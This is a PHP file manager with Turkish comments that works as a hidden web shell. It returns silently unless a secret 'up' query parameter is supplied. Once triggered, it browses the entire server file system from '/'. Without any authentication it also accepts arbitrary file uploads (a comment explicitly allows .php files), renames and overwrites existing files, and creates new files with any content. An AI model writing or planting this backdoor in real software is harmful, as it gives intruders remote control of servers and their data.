<?php
// Hangi dizinde olduğumuzu belirliyoruz
$root = __DIR__; // PHP dosyasının bulunduğu dizin
$top_level = '/'; // Sunucunun en üst düzeyi
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;

// Eğer ?up parametresi yoksa, sayfanın geri kalan kısmını etkilemeden çık
if (!isset($_GET['up'])) {
    return; // sayfayı durduruyoruz
}

// Güvenlik: Yalnızca belirtilen dizinin altında gezinebilmek için kontrol
if (strpos($current_dir, realpath($root)) !== 0 && strpos($current_dir, realpath($top_level)) !== 0) {
    die('İzin verilmedi!');
}

// Dosya yükleme işlemi
$uploaded_file_path = ''; // Yüklenen dosyanın yolu
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $target_file = $current_dir . '/' . basename($_FILES['file']['name']);
    // .php uzantılı dosyalar için yüklemeye izin ver
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        $uploaded_file_path = htmlspecialchars($target_file);
        echo 'Dosya başarıyla yüklendi: ' . htmlspecialchars(basename($_FILES['file']['name'])) . '<br>';
        echo 'Yüklenen Dosya Yolu: ' . $uploaded_file_path . '<br>';
    } else {
        echo 'Dosya yüklenemedi!';
    }
}

// Dosya adını ve içeriğini değiştirme işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['edit_file'])) {
    $old_name = basename($_POST['old_name']);
    $new_name = basename($_POST['new_name']);
    $file_content = $_POST['file_content'];
    $old_file_path = $current_dir . '/' . $old_name;
    $new_file_path = $current_dir . '/' . $new_name;

    // Dosya ismini değiştirme
    if ($old_name !== $new_name) {
        rename($old_file_path, $new_file_path);
    }
    
    // Dosya içeriğini güncelleme
    file_put_contents($new_file_path, $file_content);
    echo 'Dosya başarıyla güncellendi: ' . htmlspecialchars($new_name) . '<br>';
}

// Mevcut dizindeki dosyaları ve dizinleri listeliyoruz
$files = scandir($current_dir);

function is_image($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return in_array($ext, ['jpg', 'jpeg', 'png', 'gif']);
}

// Dizinlerde gezinme bağlantılarını oluşturma
$navigation_links = [];

// Her dizinde üst dizin bağlantısı ekliyoruz
$parent_dir = dirname($current_dir);
if ($parent_dir !== $current_dir) {
    $navigation_links[] = '<li><a href="?dir=' . urlencode($parent_dir) . '&up=' . urlencode($_GET['up']) . '">.. (Üst Dizin)</a></li>';
}

// Mevcut dizindeki dosya ve dizinler için bağlantılar oluşturma
foreach ($files as $file) {
    if ($file == '.' || $file == '..') continue; // '.' ve '..' dizinlerini atla
    $file_path = $current_dir . '/' . $file;
    if (is_dir($file_path)) {
        // Dizinler için bağlantı oluştur
        $navigation_links[] = '<li><a href="?dir=' . urlencode($file_path) . '&up=' . urlencode($_GET['up']) . '">' . htmlspecialchars($file) . '</a> (Dizin)</li>';
    } else {
        // Dosyalar için bağlantı oluştur
        $icon = is_image($file) ? '<img src="' . htmlspecialchars($file_path) . '" style="width:50px;"/>' : '';
        // Dosya içeriği ve ismini düzenlemek için popup açma butonu
        $navigation_links[] = '<li>' . htmlspecialchars($file) . ' ' . $icon . 
            '<button onclick="openModal(\'' . htmlspecialchars($file) . '\', \'' . htmlspecialchars(file_get_contents($file_path)) . '\')">✏️</button>
            </li>';
    }
}

// Site dizinine gitmek için bir bağlantı ekliyoruz
$navigation_links[] = '<li><a href="?dir=' . urlencode($root) . '&up=' . urlencode($_GET['up']) . '">Site Dizinine Git</a></li>';
// Sunucunun en üst dizinine gitmek için bir bağlantı ekliyoruz
$navigation_links[] = '<li><a href="?dir=' . urlencode($top_level) . '&up=' . urlencode($_GET['up']) . '">En Üst Dizinine Git</a></li>';

// Kullanıcıya dosyaları ve dizinleri gösterme
echo "<h2>Mevcut Dizin: " . htmlspecialchars($current_dir) . "</h2>";
echo "<ul>";
foreach ($navigation_links as $link) {
    echo $link;
}
echo "</ul>";

// Dosya Yükleme Formu
echo '<h2>Dosya Yükle</h2>';
echo '<form action="" method="post" enctype="multipart/form-data">';
echo '<input type="file" name="file" required>'; // Dosya yükleme için gerekli
echo '<input type="submit" value="Yükle">';
echo '</form>';

// Yeni dosya oluşturma formu
echo '<h2>Yeni Dosya Oluştur</h2>';
echo '<form action="" method="post">';
echo '<input type="text" name="new_file_name" placeholder="Dosya Adı" required>';
echo '<textarea name="new_file_content" placeholder="Dosya İçeriği" required></textarea>';
echo '<input type="submit" name="create_file" value="Oluştur">';
echo '</form>';

// Yeni dosya oluşturma işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['create_file'])) {
    $new_file_name = basename($_POST['new_file_name']);
    $new_file_content = $_POST['new_file_content'];
    $new_file_path = $current_dir . '/' . $new_file_name;

    // Dosya oluşturma
    file_put_contents($new_file_path, $new_file_content);
    echo 'Yeni dosya başarıyla oluşturuldu: ' . htmlspecialchars($new_file_name) . '<br>';
}

?>

<!-- Modal HTML -->
<div id="modal" style="display:none; position:fixed; left:0; top:0; width:100%; height:100%; background-color:rgba(0,0,0,0.7); z-index:1000;">
    <div style="background-color:white; margin:100px auto; padding:20px; width:300px;">
        <h2>Dosya Düzenle</h2>
        <form id="editForm" action="" method="post">
            <input type="hidden" name="old_name" id="old_name">
            <label for="new_name">Yeni İsim:</label>
            <input type="text" name="new_name" id="new_name" required>
            <label for="file_content">Dosya İçeriği:</label>
            <textarea name="file_content" id="file_content" required></textarea>
            <input type="submit" name="edit_file" value="Güncelle">
        </form>
        <button onclick="closeModal()">Kapat</button>
    </div>
</div>

<script>
function openModal(fileName, fileContent) {
    document.getElementById('old_name').value = fileName;
    document.getElementById('new_name').value = fileName; // Default to the current name
    document.getElementById('file_content').value = fileContent;
    document.getElementById('modal').style.display = 'block';
}

function closeModal() {
    document.getElementById('modal').style.display = 'none';
}
</script>
